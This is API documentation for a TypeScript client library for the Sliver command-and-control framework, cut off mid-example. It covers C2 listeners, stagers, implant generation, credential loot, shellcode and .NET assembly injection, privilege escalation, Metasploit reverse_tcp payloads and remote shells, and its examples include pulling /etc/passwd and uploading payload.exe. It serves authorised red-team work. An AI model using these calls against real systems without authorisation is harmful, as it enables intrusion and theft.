# Sliver-Script Library Documentation

**Version:** 1.2.5  
**Author:** moloch  
**License:** GPL-3.0-or-later  
**Repository:** https://github.com/moloch--/sliver-script

---

## Table of Contents

1. [Overview](#overview)
2. [Installation](#installation)
3. [Configuration](#configuration)
4. [Core Classes](#core-classes)
5. [SliverClient API](#sliverclient-api)
6. [Interactive Sessions & Beacons](#interactive-sessions--beacons)
7. [Event Streams (RxJS Observables)](#event-streams-rxjs-observables)
8. [Utility Functions](#utility-functions)
9. [Complete API Reference](#complete-api-reference)
10. [Usage Examples](#usage-examples)

---

## Overview

`sliver-script` is a TypeScript/JavaScript client library for [Sliver](https://github.com/BishopFox/sliver), a command and control (C2) framework. This library enables programmatic interaction with Sliver servers using gRPC over Mutual-TLS. It provides:

- Full TypeScript type definitions
- RxJS abstractions for real-time event streams
- Support for sessions and beacons
- Comprehensive command execution APIs
- Listener management
- Implant generation and management
- Loot and website management

⚠️ **Note:** Support for Sliver v1.5+ is a work in progress. Node v14 or later is required.

---

## Installation

```bash
npm install sliver-script
```

---

## Configuration

### SliverClientConfig Interface

```typescript
interface SliverClientConfig {
    operator: string;           // Operator name
    lhost: string;              // Server host
    lport: number;              // Server port
    ca_certificate: string;     // CA certificate (PEM format)
    certificate: string;        // Client certificate (PEM format)
    private_key: string;        // Client private key (PEM format)
    token: string;              // Authentication token
}
```

### Configuration Functions

#### `ParseConfigFile(filePath: string): Promise<SliverClientConfig>`
Loads and parses a Sliver configuration file from the filesystem.

**Parameters:**
- `filePath` (string): Path to the configuration file (e.g., `'./moloch_localhost.cfg'`)

**Returns:** Promise that resolves to a `SliverClientConfig` object

**Example:**
```typescript
const config = await ParseConfigFile('./moloch_localhost.cfg');
```

#### `ParseConfig(data: Buffer): SliverClientConfig`
Parses a Sliver configuration from a Buffer.

**Parameters:**
- `data` (Buffer): Configuration data as a Buffer

**Returns:** `SliverClientConfig` object

**Example:**
```typescript
const configData = fs.readFileSync('./config.cfg');
const config = ParseConfig(configData);
```

#### `ListConfigs(configDir: string): Promise<SliverClientConfig[]>`
Lists all configuration files in a directory.

**Parameters:**
- `configDir` (string): Directory path containing config files

**Returns:** Promise that resolves to an array of `SliverClientConfig` objects

**Example:**
```typescript
const configs = await ListConfigs('./configs');
```

---

## Core Classes

### SliverClient

The main client class for interacting with a Sliver server.

#### Constructor

```typescript
new SliverClient(config: SliverClientConfig)
```

**Parameters:**
- `config` (SliverClientConfig): Configuration object

**Example:**
```typescript
const client = new SliverClient(config);
```

#### Properties

- `config`: Returns the current `SliverClientConfig`
- `rpc`: Returns the underlying gRPC client (throws if not connected)
- `tunnelStream`: Returns the tunnel data stream (throws if not connected)
- `isConnected`: Boolean indicating connection status

#### Event Observables (RxJS)

- `event$`: Subject that emits all events from the server
- `session$`: Observable filtered for session-related events
- `job$`: Observable filtered for job-related events
- `client$`: Observable filtered for client-related events
- `loot$`: Observable filtered for loot-related events

---

## SliverClient API

### Connection Management

#### `connect(): Promise<SliverClient>`
Establishes connection to the Sliver server and sets up event/tunnel streams.

**Returns:** Promise that resolves to the connected `SliverClient` instance

**Example:**
```typescript
await client.connect();
console.log('Connected!');
```

#### `disconnect(): Promise<void>`
Closes the connection and cleans up streams.

**Returns:** Promise that resolves when disconnected

**Example:**
```typescript
await client.disconnect();
```

#### `rpcHost(): string`
Returns the RPC host string in format `host:port`.

**Returns:** String in format `"host:port"`

#### `rpcCredentials(): grpc.ChannelCredentials`
Returns the gRPC channel credentials configured with mTLS and Bearer token authentication.

**Returns:** gRPC ChannelCredentials object

---

### Server Information

#### `getVersion(timeout?: number): Promise<clientpb.Version | undefined>`
Gets the Sliver server version information.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to version information

**Example:**
```typescript
const version = await client.getVersion();
console.log(`Server version: ${version?.Major}.${version?.Minor}.${version?.Patch}`);
```

#### `getOperators(timeout?: number): Promise<clientpb.Operator[] | undefined>`
Gets a list of operators connected to the server.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to array of Operator objects

**Example:**
```typescript
const operators = await client.getOperators();
operators?.forEach(op => console.log(`Operator: ${op.Name}`));
```

#### `compilerInfo(timeout?: number): Promise<clientpb.Compiler | undefined>`
Gets compiler information from the server.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to compiler information

---

### Session Management

#### `sessions(timeout?: number): Promise<clientpb.Session[] | undefined>`
Retrieves all active sessions.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to array of Session objects

**Example:**
```typescript
const sessions = await client.sessions();
sessions?.forEach(s => {
    console.log(`Session ${s.ID}: ${s.Name} @ ${s.RemoteAddress}`);
});
```

#### `interactSession(sessionID: string, timeout?: number): Promise<InteractiveSession>`
Creates an interactive session object for command execution.

**Parameters:**
- `sessionID` (string): The session ID to interact with
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to an `InteractiveSession` instance

**Example:**
```typescript
const sessions = await client.sessions();
if (sessions && sessions.length > 0) {
    const interactive = await client.interactSession(sessions[0].ID);
    const processes = await interactive.ps();
    console.log(processes);
}
```

---

### Beacon Management

#### `beacons(timeout?: number): Promise<clientpb.Beacon[] | undefined>`
Retrieves all active beacons.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to array of Beacon objects

**Example:**
```typescript
const beacons = await client.beacons();
beacons?.forEach(b => {
    console.log(`Beacon ${b.ID}: ${b.Name}`);
});
```

#### `interactBeacon(beaconID: string, timeout?: number): Promise<InteractiveBeacon>`
Creates an interactive beacon object for command execution.

**Parameters:**
- `beaconID` (string): The beacon ID to interact with
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to an `InteractiveBeacon` instance

**Example:**
```typescript
const beacons = await client.beacons();
if (beacons && beacons.length > 0) {
    const interactive = await client.interactBeacon(beacons[0].ID);
    const processes = await interactive.ps();
    console.log(processes);
}
```

---

### Job Management

#### `jobs(timeout?: number): Promise<clientpb.Job[] | undefined>`
Retrieves all active jobs on the server.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to array of Job objects

**Example:**
```typescript
const jobs = await client.jobs();
jobs?.forEach(job => {
    console.log(`Job ${job.ID}: ${job.Name}`);
});
```

#### `killJob(jobId: number, timeout?: number): Promise<clientpb.KillJob | undefined>`
Terminates a running job.

**Parameters:**
- `jobId` (number): The job ID to kill
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to kill result

**Example:**
```typescript
await client.killJob(1);
```

---

### Listener Management

#### `startMTLSListener(host: string, port: number, persistent?: boolean, timeout?: number): Promise<clientpb.MTLSListener | undefined>`
Starts a Mutual TLS listener.

**Parameters:**
- `host` (string): Host address to bind to
- `port` (number): Port to listen on
- `persistent` (boolean, optional): Whether the listener persists across restarts (default: false)
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to listener information

**Example:**
```typescript
const listener = await client.startMTLSListener('0.0.0.0', 8888, true);
console.log(`MTLS listener started on port ${listener?.Port}`);
```

#### `startDNSListener(domains: string[], canaries: boolean, host: string, port: number, persistent?: boolean, timeout?: number): Promise<clientpb.DNSListener | undefined>`
Starts a DNS listener.

**Parameters:**
- `domains` (string[]): Array of domains to listen on
- `canaries` (boolean): Enable canary domains
- `host` (string): Host address to bind to
- `port` (number): Port to listen on
- `persistent` (boolean, optional): Whether the listener persists (default: false)
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to listener information

**Example:**
```typescript
const listener = await client.startDNSListener(['example.com'], true, '0.0.0.0', 53, true);
```

#### `startHTTPListener(domain: string, host: string, port: number, website?: string, persistent?: boolean, timeout?: number): Promise<clientpb.HTTPListener | undefined>`
Starts an HTTP listener.

**Parameters:**
- `domain` (string): Domain for the listener
- `host` (string): Host address to bind to
- `port` (number): Port to listen on
- `website` (string, optional): Website name to serve (default: '')
- `persistent` (boolean, optional): Whether the listener persists (default: false)
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to listener information

**Example:**
```typescript
const listener = await client.startHTTPListener('example.com', '0.0.0.0', 80);
```

#### `startHTTPSListener(domain: string, host: string, port: number, acme?: boolean, website?: string, cert?: Buffer, key?: Buffer, persistent?: boolean, timeout?: number): Promise<clientpb.HTTPListener | undefined>`
Starts an HTTPS listener.

**Parameters:**
- `domain` (string): Domain for the listener
- `host` (string): Host address to bind to
- `port` (number): Port to listen on
- `acme` (boolean, optional): Use ACME (Let's Encrypt) for certificates (default: false)
- `website` (string, optional): Website name to serve (default: '')
- `cert` (Buffer, optional): Custom certificate
- `key` (Buffer, optional): Custom private key
- `persistent` (boolean, optional): Whether the listener persists (default: false)
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to listener information

**Example:**
```typescript
const listener = await client.startHTTPSListener('example.com', '0.0.0.0', 443, true);
```

#### `startWGListener(port: number, nPort: number, keyPort: number, persistent?: boolean, timeout?: number): Promise<clientpb.WGListener | undefined>`
Starts a WireGuard listener.

**Parameters:**
- `port` (number): WireGuard port
- `nPort` (number): N port
- `keyPort` (number): Key exchange port
- `persistent` (boolean, optional): Whether the listener persists (default: false)
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to listener information

#### `startTCPStagerListener(host: string, port: number, data: Buffer, timeout?: number): Promise<clientpb.StagerListener | undefined>`
Starts a TCP stager listener.

**Parameters:**
- `host` (string): Host address to bind to
- `port` (number): Port to listen on
- `data` (Buffer): Stager shellcode/payload
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to listener information

#### `startHTTPStagerListener(host: string, port: number, data: Buffer, timeout?: number): Promise<clientpb.StagerListener | undefined>`
Starts an HTTP stager listener.

**Parameters:**
- `host` (string): Host address to bind to
- `port` (number): Port to listen on
- `data` (Buffer): Stager shellcode/payload
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to listener information

#### `startHTTPSStagerListener(host: string, port: number, data: Buffer, timeout?: number): Promise<clientpb.StagerListener | undefined>`
Starts an HTTPS stager listener.

**Parameters:**
- `host` (string): Host address to bind to
- `port` (number): Port to listen on
- `data` (Buffer): Stager shellcode/payload
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to listener information

---

### Implant Generation & Management

#### `generate(config: clientpb.ImplantConfig, timeout?: number): Promise<commonpb.File | undefined>`
Generates a new implant with the specified configuration.

**Parameters:**
- `config` (clientpb.ImplantConfig): Implant configuration
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to the generated file

**Example:**
```typescript
const config = new clientpb.ImplantConfig();
config.GOOS = 'windows';
config.GOARCH = 'amd64';
config.Format = clientpb.OutputFormat.EXECUTABLE;
const implant = await client.generate(config);
```

#### `regenerate(name: string, timeout?: number): Promise<commonpb.File | undefined>`
Regenerates an existing implant build.

**Parameters:**
- `name` (string): Name of the implant to regenerate
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to the regenerated file

#### `implantBuilds(timeout?: number): Promise<clientpb.ImplantBuilds | undefined>`
Gets a list of all implant builds.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to implant builds information

**Example:**
```typescript
const builds = await client.implantBuilds();
builds?.Configs?.forEach(cfg => console.log(`Build: ${cfg.Name}`));
```

#### `deleteImplantBuild(name: string, timeout?: number): Promise<void>`
Deletes an implant build.

**Parameters:**
- `name` (string): Name of the implant build to delete
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise that resolves when deleted

#### `canaries(timeout?: number): Promise<clientpb.DNSCanary[] | undefined>`
Gets DNS canaries.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to array of DNS canary records

#### `implantProfiles(timeout?: number): Promise<clientpb.ImplantProfile[] | undefined>`
Gets all implant profiles.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to array of implant profiles

**Example:**
```typescript
const profiles = await client.implantProfiles();
profiles?.forEach(p => console.log(`Profile: ${p.Name}`));
```

#### `saveImplantProfile(profile: clientpb.ImplantProfile, timeout?: number): Promise<clientpb.ImplantProfile | undefined>`
Saves or updates an implant profile.

**Parameters:**
- `profile` (clientpb.ImplantProfile): Profile to save
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to the saved profile

#### `deleteImplantProfile(name: string, timeout?: number): Promise<void>`
Deletes an implant profile.

**Parameters:**
- `name` (string): Profile name to delete
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise that resolves when deleted

---

### Loot Management

#### `lootAll(timeout?: number): Promise<clientpb.Loot[] | undefined>`
Retrieves all loot items.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to array of loot items

**Example:**
```typescript
const allLoot = await client.lootAll();
allLoot?.forEach(loot => console.log(`Loot: ${loot.Name}`));
```

#### `lootAllOf(lootType: string, timeout?: number): Promise<clientpb.Loot[] | undefined>`
Retrieves loot of a specific type.

**Parameters:**
- `lootType` (string): Type of loot ('credential', 'creds', 'file', etc.)
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to array of loot items of the specified type

**Example:**
```typescript
const credentials = await client.lootAllOf('credentials');
const files = await client.lootAllOf('file');
```

#### `lootAdd(loot: clientpb.Loot, timeout?: number): Promise<clientpb.Loot | undefined>`
Adds a new loot item.

**Parameters:**
- `loot` (clientpb.Loot): Loot object to add
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to the added loot item

#### `lootUpdate(lootID: string, name: string, timeout?: number): Promise<clientpb.Loot | undefined>`
Updates a loot item's name.

**Parameters:**
- `lootID` (string): ID of the loot to update
- `name` (string): New name for the loot
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to the updated loot item

#### `lootRemove(lootID: string, timeout?: number): Promise<void>`
Removes a loot item.

**Parameters:**
- `lootID` (string): ID of the loot to remove
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise that resolves when removed

#### `lootContent(lootID: string, timeout?: number): Promise<clientpb.Loot | undefined>`
Retrieves the content of a loot item.

**Parameters:**
- `lootID` (string): ID of the loot item
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to loot item with content

---

### Website Management

#### `websites(timeout?: number): Promise<clientpb.Website[] | undefined>`
Gets all configured websites.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to array of websites

**Example:**
```typescript
const sites = await client.websites();
sites?.forEach(site => console.log(`Website: ${site.Name}`));
```

#### `website(name: string, timeout?: number): Promise<clientpb.Website | undefined>`
Gets a specific website by name.

**Parameters:**
- `name` (string): Website name
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to website information

#### `websiteRemove(name: string, timeout?: number): Promise<void>`
Removes a website.

**Parameters:**
- `name` (string): Website name to remove
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise that resolves when removed

#### `websiteAddContent(name: string, contents: Map<string, clientpb.WebContent>, timeout?: number): Promise<clientpb.Website | undefined>`
Adds content to a website.

**Parameters:**
- `name` (string): Website name
- `contents` (Map<string, clientpb.WebContent>): Map of path to content
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to updated website

#### `websiteUpdateContent(name: string, contents: Map<string, clientpb.WebContent>, timeout?: number): Promise<clientpb.Website | undefined>`
Updates website content.

**Parameters:**
- `name` (string): Website name
- `contents` (Map<string, clientpb.WebContent>): Map of path to content
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to updated website

#### `websiteRemoveContent(name: string, paths: string[], timeout?: number): Promise<clientpb.Website | undefined>`
Removes content from a website.

**Parameters:**
- `name` (string): Website name
- `paths` (string[]): Array of content paths to remove
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to updated website

---

## Interactive Sessions & Beacons

Both `InteractiveSession` and `InteractiveBeacon` extend the `BaseCommands` class and provide the following methods:

### System Information

#### `ping(nonce: number, timeout?: number): Promise<sliverpb.Ping | undefined>`
Pings the implant.

**Parameters:**
- `nonce` (number): Nonce value for the ping
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to ping response

**Example:**
```typescript
const pong = await interactive.ping(12345);
console.log(`Ping: ${pong?.Nonce}`);
```

#### `ps(timeout?: number): Promise<commonpb.Process[] | undefined>`
Lists running processes.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to array of process objects

**Example:**
```typescript
const processes = await interactive.ps();
processes?.forEach(proc => {
    console.log(`PID: ${proc.Pid}, Name: ${proc.Executable}`);
});
```

#### `ifconfig(timeout?: number): Promise<sliverpb.Ifconfig | undefined>`
Gets network interface configuration.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to network interface information

**Example:**
```typescript
const ifconfig = await interactive.ifconfig();
ifconfig?.NetInterfaces?.forEach(iface => {
    console.log(`Interface: ${iface.Name}`);
});
```

#### `netstat(timeout?: number): Promise<sliverpb.Netstat | undefined>`
Gets network statistics and connections.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to network statistics

**Example:**
```typescript
const netstat = await interactive.netstat();
```

---

### File System Operations

#### `ls(path?: string, timeout?: number): Promise<sliverpb.Ls | undefined>`
Lists files in a directory.

**Parameters:**
- `path` (string, optional): Directory path (default: '.')
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to directory listing

**Example:**
```typescript
const listing = await interactive.ls('/tmp');
listing?.Files?.forEach(file => {
    console.log(`${file.Name} - ${file.Size} bytes`);
});
```

#### `cd(path: string, timeout?: number): Promise<sliverpb.Pwd | undefined>`
Changes the current working directory.

**Parameters:**
- `path` (string): Directory path to change to
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to new current directory

**Example:**
```typescript
const pwd = await interactive.cd('/tmp');
console.log(`Current directory: ${pwd?.Path}`);
```

#### `pwd(timeout?: number): Promise<sliverpb.Pwd | undefined>`
Gets the current working directory.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to current directory

**Example:**
```typescript
const pwd = await interactive.pwd();
console.log(`Current directory: ${pwd?.Path}`);
```

#### `rm(path: string, timeout?: number): Promise<sliverpb.Rm | undefined>`
Removes a file or directory.

**Parameters:**
- `path` (string): Path to remove
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to removal result

**Example:**
```typescript
await interactive.rm('/tmp/test.txt');
```

#### `mkdir(path: string, timeout?: number): Promise<sliverpb.Mkdir | undefined>`
Creates a directory.

**Parameters:**
- `path` (string): Directory path to create
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to creation result

**Example:**
```typescript
await interactive.mkdir('/tmp/newdir');
```

#### `download(path: string, timeout?: number): Promise<Buffer>`
Downloads a file from the target.

**Parameters:**
- `path` (string): File path to download
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to file data as Buffer

**Example:**
```typescript
const fileData = await interactive.download('/etc/passwd');
fs.writeFileSync('./passwd', fileData);
```

#### `upload(path: string, data: Buffer, timeout?: number): Promise<sliverpb.Upload | undefined>`
Uploads a file to the target.

**Parameters:**
- `path` (string): Destination path on target
- `data` (Buffer): File data to upload
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to upload result

**Example:**
```typescript
const data = fs.readFileSync('./payload.exe');
await interactive.upload('C:\\Windows\\Temp\\payload.exe', data);
```

---

### Process Operations

#### `terminate(pid: number, timeout?: number): Promise<sliverpb.Terminate | undefined>`
Terminates a process by PID.

**Parameters:**
- `pid` (number): Process ID to terminate
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to termination result

**Example:**
```typescript
await interactive.terminate(1234);
```

#### `processDump(pid: number, timeout?: number): Promise<sliverpb.ProcessDump | undefined>`
Dumps process memory.

**Parameters:**
- `pid` (number): Process ID to dump
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to process dump data

**Example:**
```typescript
const dump = await interactive.processDump(1234);
```

---

### Execution & Injection

#### `execute(exe: string, args: string[], output: boolean, timeout?: number): Promise<sliverpb.Execute | undefined>`
Executes a command on the target.

**Parameters:**
- `exe` (string): Executable path
- `args` (string[]): Command arguments
- `output` (boolean): Capture output
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to execution result

**Example:**
```typescript
const result = await interactive.execute('whoami', [], true);
console.log(`Output: ${result?.Stdout}`);
```

#### `executeShellcode(pid: number, shellcode: Buffer, encoder: string, rwx: boolean, timeout?: number): Promise<sliverpb.Task | undefined>`
Executes shellcode in a process.

**Parameters:**
- `pid` (number): Target process ID (0 for current process)
- `shellcode` (Buffer): Shellcode bytes
- `encoder` (string): Encoder to use (e.g., 'gzip', '')
- `rwx` (boolean): Use RWX pages
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to task result

**Example:**
```typescript
const shellcode = Buffer.from('...'); // Your shellcode
await interactive.executeShellcode(0, shellcode, '', true);
```

#### `executeAssembly(assembly: Buffer, args: string, process: string, timeout?: number): Promise<sliverpb.ExecuteAssembly | undefined>`
Executes a .NET assembly in memory.

**Parameters:**
- `assembly` (Buffer): .NET assembly bytes
- `args` (string): Arguments to pass to assembly
- `process` (string): Host process name
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to execution result

**Example:**
```typescript
const assemblyData = fs.readFileSync('./SharpHound.exe');
const result = await interactive.executeAssembly(assemblyData, '-c All', 'notepad.exe');
console.log(result?.Output);
```

#### `sideload(data: Buffer, processName: string, args: string, entryPoint: string, timeout?: number): Promise<sliverpb.Sideload | undefined>`
Sideloads a DLL into a process.

**Parameters:**
- `data` (Buffer): DLL bytes
- `processName` (string): Process to inject into
- `args` (string): Arguments
- `entryPoint` (string): Entry point function name
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to sideload result

#### `spawnDLL(data: Buffer, entrypoint: string, processName: string, args: string, timeout?: number): Promise<sliverpb.SpawnDll | undefined>`
Spawns a DLL in a new process.

**Parameters:**
- `data` (Buffer): DLL bytes
- `entrypoint` (string): Entry point function name
- `processName` (string): Process to spawn
- `args` (string): Arguments
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to spawn result

---

### Privilege Escalation & Impersonation

#### `runAs(userName: string, processName: string, args: string, timeout?: number): Promise<sliverpb.RunAs | undefined>`
Runs a process as another user.

**Parameters:**
- `userName` (string): Username to run as
- `processName` (string): Process to execute
- `args` (string): Process arguments
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to execution result

#### `impersonate(userName: string, timeout?: number): Promise<sliverpb.Impersonate | undefined>`
Impersonates a user token.

**Parameters:**
- `userName` (string): Username to impersonate
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to impersonation result

#### `revToSelf(timeout?: number): Promise<sliverpb.RevToSelf | undefined>`
Reverts token impersonation.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to revert result

#### `getSystem(hostingProcess: string, config: clientpb.ImplantConfig, timeout?: number): Promise<sliverpb.GetSystem | undefined>`
Attempts to get SYSTEM privileges.

**Parameters:**
- `hostingProcess` (string): Process to host the SYSTEM implant
- `config` (clientpb.ImplantConfig): Implant configuration
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to privilege escalation result

---

### Metasploit Integration

#### `msf(payload: string, lhost: string, lport: number, encoder: string, iterations: number, timeout?: number): Promise<void>`
Executes a Metasploit payload in the current process.

**Parameters:**
- `payload` (string): MSF payload name (e.g., 'windows/meterpreter/reverse_tcp')
- `lhost` (string): Listener host
- `lport` (number): Listener port
- `encoder` (string): Encoder to use
- `iterations` (number): Encoding iterations
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise that resolves when executed

#### `msfRemote(pid: number, payload: string, lhost: string, lport: number, encoder: string, iterations: number, timeout?: number): Promise<void>`
Executes a Metasploit payload in a remote process.

**Parameters:**
- `pid` (number): Target process ID
- `payload` (string): MSF payload name
- `lhost` (string): Listener host
- `lport` (number): Listener port
- `encoder` (string): Encoder to use
- `iterations` (number): Encoding iterations
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise that resolves when executed

---

### Process Migration

#### `migrate(pid: number, config: clientpb.ImplantConfig, timeout?: number): Promise<sliverpb.Migrate | undefined>`
Migrates the implant to another process.

**Parameters:**
- `pid` (number): Target process ID
- `config` (clientpb.ImplantConfig): Implant configuration
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to migration result

---

### Screenshot

#### `screenshot(timeout?: number): Promise<sliverpb.Screenshot | undefined>`
Takes a screenshot of the target system.

**Parameters:**
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to screenshot data

**Example:**
```typescript
const screenshot = await interactive.screenshot();
if (screenshot?.Data) {
    fs.writeFileSync('./screenshot.png', Buffer.from(screenshot.Data));
}
```

---

### Interactive Shell (Session Only)

#### `shell(path: string, pty: boolean, timeout?: number): Promise<Tunnel>`
Opens an interactive shell session.

**Note:** This method is **only available on `InteractiveSession`**, not on `InteractiveBeacon`.

**Parameters:**
- `path` (string): Shell path (e.g., '/bin/bash', 'cmd.exe', 'powershell.exe')
- `pty` (boolean): Enable pseudo-terminal
- `timeout` (number, optional): Timeout in seconds (default: 30)

**Returns:** Promise resolving to a `Tunnel` object with `stdin` (Observer) and `stdout` (Observable)

**Example:**
```typescript
const tunnel = await interactive.shell('/bin/bash', true);

// Subscribe to stdout
tunnel.stdout.subscribe({
    next: (data) => {
        process.stdout.write(data);
    },
    complete: () => {
        console.log('Shell closed');
    },
    error: (err) => {
        console.error('Shell error:', err);
    }
});

// Send commands via stdin
tunnel.stdin.next(Buffer.from('whoami\n'));
tunnel.stdin.next(Buffer.from('exit\n'));

// Close the shell
tunnel.stdin.complete();
```

---

## Event Streams (RxJS Observables)

The `SliverClient` provides RxJS Observables for real-time event monitoring:

### Event Types (Events Enum)

```typescript
enum Events {
    ServerError = "server-error",
    SessionConnected = "session-connected",
    SessionDisconnected = "session-disconnected",
    ClientJoined = "client-joined",
    ClientLeft = "client-left",
    Canary = "canary",
    JobStarted = "job-started",
    JobStopped = "job-stopped",
    Build = "build",
    BuildCompleted = "build-completed",
    Profile = "profile",
    Website = "website",
    LootAddedEvent = "loot-added",
    LootRemovedEvent = "loot-removed"
}
```

### Observable Properties

- **`event$`**: Subject that emits all events
- **`session$`**: Observable filtered for session-related events
- **`job$`**: Observable filtered for job-related events
- **`client$`**: Observable filtered for client-related events
- **`loot$`**: Observable filtered for loot-related events

### Example: Monitoring All Events

```typescript
import { SliverClient, ParseConfigFile } from 'sliver-script';

(async function() {
    const config = await ParseConfigFile('./config.cfg');
    const client = new SliverClient(config);
    await client.connect();

    // Subscribe to all events
    client.event$.subscribe({
        next: (event) => {
            console.log('Event:', event.EventType);
            console.log('Data:', event);
        },
        error: (err) => {
            console.error('Event stream error:', err);
        },
        complete: () => {
            console.log('Event stream closed');
        }
    });

    // Keep the script running
    await new Promise(() => {});
})();
```

### Example: Monitoring Session Events Only

```typescript
client.session$.subscribe({
    next: (event) => {
        if (event.Session) {
            console.log(`Session event: ${event.EventType}`);
            console.log(`Session ID: ${event.Session.ID}`);
            console.log(`Session Name: ${event.Session.Name}`);
        }
    }
});
```

### Example: Monitoring Job Events

```typescript
client.job$.subscribe({
    next: (event) => {
        if (event.Job) {
            console.log(`Job ${event.Job.ID}: ${event.EventType}`);
        }
    }
});
```

---

## Utility Functions

### `gzip(data: Buffer): Promise<Buffer>`
Compresses data using gzip.

**Parameters:**
- `data` (Buffer): Data to compress

**Returns:** Promise resolving to compressed Buffer

**Example:**
```typescript
import { gzip } from 'sliver-script';

const compressed = await gzip(Buffer.from('Hello, world!'));
```

### `gunzip(data: Buffer): Promise<Buffer>`
Decompresses gzip data.

**Parameters:**
- `data` (Buffer): Compressed data

**Returns:** Promise resolving to decompressed Buffer

**Example:**
```typescript
import { gunzip } from 'sliver-script';

const decompressed = await gunzip(compressedData);
console.log(decompressed.toString());
```

---

## Complete API Reference

### Exports

The library exports the following:

```typescript
export {
    // Classes
    SliverClient,
    InteractiveSession,
    InteractiveBeacon,
    
    // Config functions
    ParseConfigFile,
    ParseConfig,
    ListConfigs,
    
    // Utility functions
    gzip,
    gunzip,
    
    // Types
    SliverClientConfig,
    Tunnel,
    
    // Event enum
    Events
}
```

---

## Usage Examples

### Example 1: Basic Connection and Session Listing

```typescript
import { SliverClient, ParseConfigFile } from 'sliver-script';

(async function() {
    // Load configuration
    const config = await ParseConfigFile('./moloch_localhost.cfg');
    
    // Create client
    const client = new SliverClient(config);
    
    // Connect to server
    console.log(`Connecting to ${config.lhost}:${config.lport} ...`);
    await client.connect();
    console.log('Connected!');
    
    // Get server version
    const version = await client.getVersion();
    console.log(`Server version: ${version?.Major}.${version?.Minor}.${version?.Patch}`);
    
    // List sessions
    const sessions = await client.sessions();
    console.log(`Active sessions: ${sessions?.length || 0}`);
    sessions?.forEach(session => {
